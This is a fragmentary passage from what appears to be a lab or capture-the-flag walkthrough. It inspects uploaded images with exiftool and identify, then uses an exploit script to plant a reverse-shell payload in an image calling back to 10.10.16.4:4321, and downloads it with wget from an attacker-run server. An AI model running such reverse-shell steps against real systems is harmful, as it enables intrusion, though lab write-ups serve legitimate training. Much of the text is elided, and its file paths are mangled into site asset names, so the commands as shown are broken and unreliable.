...
![](/assets/img/posts/pasted-image-20260819223039-png.svg)
...
![[Pasted image /assets/img/posts/20250816233216-png.svg]]
...
![](/assets/img/posts/pasted-image-20260819224454-png.svg)

We will use exiftool to check if there is payload added to the actual image or not: <https://github.com/exiftool/exiftool>
```
exiftool /assets/img/posts/image-png.svg
```

![[Pasted image /assets/img/posts/20250816233349-png.svg]]
...
![](/assets/img/posts/pasted-image-20260819224701-png.svg)

Then let us download the images that we have uploaded. to analyze the file by this command:
```
identify -verbose /assets/img/posts/6sd1f4dfdf-png.svg
```

![[Pasted image /assets/img/posts/20250816233412-png.svg]]
...
![[Pasted image /assets/img/posts/20250816233439-png.svg]]
...
![[Pasted image /assets/img/posts/20250816233500-png.svg]]
...
![[Pasted image /assets/img/posts/20250816233516-png.svg]]
...
![[Pasted image /assets/img/posts/20250816233538-png.svg]]
...
sqlite> .dump
```
![[Pasted image /assets/img/posts/20250816233554-png.svg]]
...
![[Pasted image /assets/img/posts/20250816233613-png.svg]]
...
![[Pasted image /assets/img/posts/20250816233653-png.svg]]
...
![[Pasted image /assets/img/posts/20250816233704-png.svg]]
...
![[Pasted image /assets/img/posts/20250816233723-png.svg]]
...
![[Pasted image /assets/img/posts/20250816233732-png.svg]]

So we will add a reverse shell payload to the image, by putting the image in the folder of the exploit
```
python3 51249.py /assets/img/posts/binwalk-exploit-png.svg 10.10.16.4 4321
```
It will generate the image: /assets/img/posts/binwalk-exploit-png.svg

![](/assets/img/posts/pasted-image-20260819230522-png.svg)
...
Second, from another terminal from our kali, make a web server where the /assets/img/posts/binwalk-exploit-png.svg is there
```
...
```
wget 10.10.16.4:5555//assets/img/posts/binwalk-exploit-png.svg
```
